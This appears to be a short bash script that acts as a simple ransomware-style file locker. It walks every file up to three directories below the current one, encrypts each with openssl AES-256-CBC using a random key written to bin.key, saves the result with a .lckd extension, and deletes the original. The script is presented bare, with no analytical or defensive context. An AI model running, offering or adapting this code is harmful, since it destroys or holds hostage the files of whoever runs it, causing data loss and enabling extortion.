while :
do
        FILES=`find * -maxdepth 3 -type f \(  ! -iname "*.lckd"  ! -iname "*.key" \)`;
        CWD=`pwd`
        #echo "$CWD"
        privatekey_file=$CWD/bin.key
        rm -f $privatekey_file
        openssl rand -base64 8 >>$privatekey_file
        for file in $FILES;
        do
                rand=$RANDOM
                encrypt_filename1=$file.lckd
                printf 'Encrypted to:  %s\n' "$encrypt_filename1"
                `openssl enc -aes-256-cbc -salt -pbkdf2 -in $file -out $encrypt_filename1 -pass file:$privatekey_file`
                `rm $file`
                sleep 2;
        done
        break
done
